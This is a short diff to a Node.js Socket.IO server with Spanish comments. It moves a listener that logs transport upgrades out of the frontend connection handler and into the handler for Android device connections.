@@ -124,6 +124,12 @@ androidIo.on("connection", async (socket) => {
     const clientIp = getClientIp(socket);
     console.log(chalk.cyan(`[i] New connection attempt from ${clientIp}`));
 
+    // Detectar si el transporte cambia (Upgrade)
+    socket.conn.on('upgrade', () => {
+        const newTransport = socket.conn.transport.name;
+        console.log(`Conexión mejorada a: ${newTransport}`);
+    });
+
     try {
         const dataStr = socket.handshake.query.info;
 
@@ -410,12 +416,6 @@ const getClientIp = (socket) => {
 // Socket io Connection for Frontend
 frontendIo.on("connection", async (socket) => {
     console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id})`))
-
-    // Detectar si el transporte cambia (Upgrade)
-    socket.on('upgrade', () => {
-        const newTransport = socket.conn.transport.name;
-        console.log(`Conexión mejorada a: ${newTransport}`);
-    });
 
     try {
         const deviceList = Array.from(devices.values()).map((d) => ({
